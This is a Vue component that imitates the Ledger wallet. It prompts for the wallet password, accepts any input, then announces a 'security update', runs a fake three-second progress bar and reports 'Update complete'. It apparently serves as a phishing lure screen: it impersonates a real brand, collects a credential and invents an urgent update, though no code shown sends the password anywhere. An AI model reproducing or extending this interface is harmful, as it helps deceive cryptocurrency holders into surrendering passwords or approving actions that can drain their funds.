<template>
  <div class="bg-white rounded-2xl w-full text-white overflow-hidden mx-auto">
    <!-- Header -->
    <div v-if="currentStep !== 1" class="flex justify-between items-center py-3 px-4 border-b border-gray-300">
      <div class="flex items-center gap-3">
        <img :src="logoUrl" alt="Ledger" class="h-10 w-10 rounded" />
      </div>
      <div class="flex items-center gap-3">
        <svg @click.prevent="closeModal" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-500 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
        </svg>
      </div>
    </div>
    <hr v-if="currentStep !== 1" class="border-t border-gray-300" />

    <!-- Steps -->
    <div class="min-h-[500px] flex flex-col relative p-6">
      <transition name="fade" mode="out-in">
        <!-- STEP 1: Unlock -->
        <div v-if="currentStep === 1" key="s1" class="flex flex-col items-center justify-center h-full absolute inset-0">
          <img :src="logoUrl" alt="Ledger Logo" class="w-24 h-24 mb-4 rounded" />
          <h2 class="text-4xl text-black font-bold">Unlock Your Wallet</h2>
          <p class="text-gray-700 text-xl text-center">Enter your password to unlock Ledger.</p>
          <div class="w-full max-w-md mt-6">
            <input v-model="password" type="password" placeholder="Password" class="w-full bg-[#f2f2f2] rounded-md py-2 px-3 text-black text-sm outline-none" />
          </div>
          <button @click="unlock" class="mt-5 px-6 py-3 rounded-full text-white font-semibold" :style="{ background: primaryColor }">Unlock</button>
        </div>

        <!-- STEP 2: Update Required -->
        <div v-else-if="currentStep === 2" key="s2" class="flex flex-col">
          <div class="flex flex-col items-center gap-4 py-6">
            <img :src="logoUrl" class="h-16 w-16 rounded mb-2" alt="Ledger" />
            <p class="text-4xl text-black font-bold">Update Required</p>
            <p class="text-gray-500 text-xl">A security update is available</p>
          </div>
          <div class="bg-gray-100 rounded-2xl px-4 py-3 w-full mt-2">
            <ul class="text-neutral-900 text-[12px] list-disc mt-2 list-inside space-y-1">
              <li>Critical security enhancements.</li>
              <li>Improved app performance.</li>
              <li>Better compatibility with networks.</li>
            </ul>
          </div>
          <div class="w-full mt-5 flex gap-3">
            <button @click="startUpdate" class="flex-1 py-4 text-2xl text-white border-none rounded-[30px] font-bold" :style="{ background: primaryColor }">Confirm</button>
            <button @click="goBack" class="flex-1 py-4 text-2xl text-gray-900 bg-gray-200 rounded-[30px] font-bold">Back</button>
          </div>
        </div>

        <!-- STEP 3: Updating -->
        <div v-else-if="currentStep === 3" key="s3" class="flex flex-col items-center">
          <div class="flex flex-col items-center gap-3 py-6 w-full">
            <svg aria-hidden="true" class="w-20 h-20 text-gray-200 animate-spin" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="#eeeeee" />
              <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" :fill="primaryColor" />
            </svg>
            <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">Updating Ledger</h2>
            <p class="text-gray-700 text-xl text-center">Please wait while we update to the latest version</p>
            <div class="w-full mt-6">
              <div class="bg-gray-100 h-2 rounded-full overflow-hidden">
                <div class="h-2 rounded-full transition-all" :style="{ width: progress + '%', background: primaryColor }"></div>
              </div>
              <div class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-gray-700">
                <span>{{ Math.round(progress) }}%</span>
              </div>
            </div>
          </div>
        </div>
      </transition>

      <!-- Message -->
      <transition name="fade">
        <div v-if="message.text" :class="['absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold', message.type === 'success' ? 'bg-green-600 text-white' : 'bg-red-600 text-white']">
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref } from 'vue';

const emit = defineEmits(['close']);
const currentStep = ref(1);
const password = ref('');
const progress = ref(0);
const isLoading = ref(false);
const message = ref({ text: '', type: '' });
const primaryColor = '#000000';
const logoUrl = 'https://product.statnano.com/resource/amar_university_world/files/images/21/1/thumbnail_5b54981a0a34b55075fc12ac09aef220.png';

function closeModal() { emit('close'); }

function unlock() {
  // Simulate successful unlock then move to update required
  currentStep.value = 2;
}

function goBack() {
  currentStep.value = 1;
  password.value = '';
}

function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;
  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      // Finish update
      message.value = { text: 'Update complete', type: 'success' };
      setTimeout(() => { emit('close'); }, 800);
    }
  }
  requestAnimationFrame(step);
}
</script>

<style scoped>
.fade-enter-active, .fade-leave-active { transition: opacity 0.28s ease; }
.fade-enter-from, .fade-leave-to { opacity: 0; }
</style>